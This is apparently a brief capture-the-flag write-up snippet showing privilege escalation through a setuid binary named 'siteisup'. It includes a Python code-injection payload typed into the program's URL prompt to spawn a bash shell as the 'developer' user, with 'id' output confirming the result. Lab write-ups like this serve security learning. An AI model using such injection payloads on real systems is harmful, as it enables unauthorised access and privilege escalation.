# Setuid
```
$ ls -al siteisup
-rwsr-x--- 1 developer www-data 16928 Jun 22  2022 siteisup
$ file siteisup
siteisup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b5bbc1de286529f5291b48db8202eefbafc92c1f, for GNU/Linux 3.2.0, not stripped
$ ./siteisup
Enter URL here:__import__('os').system('/bin/bash')
$ id
uid=1002(developer) gid=33(www-data) groups=33(www-data)
```
